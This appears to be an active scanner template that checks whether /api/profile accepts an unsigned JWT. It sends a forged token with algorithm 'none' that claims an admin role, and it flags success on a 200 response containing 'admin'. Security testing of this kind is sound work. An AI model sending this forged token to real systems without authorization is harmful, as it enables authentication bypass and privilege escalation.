id: jwt2-61
name: 'JWT none kid key-160'
severity: critical
type: active
tags:
  - jwt
  - auth
  - none
description: 'Unsigned token accepted on /api/profile'
requests:
  - method: GET
    path: '{{BaseURL}}/api/profile'
    match-all: true
    sendHeaders:
      Authorization: 'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoia2V5LTE2MCJ9.eyJzdWIiOiJ1NjAiLCJyb2xlIjoiYWRtaW4ifQ.'
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words:
          - 'admin'
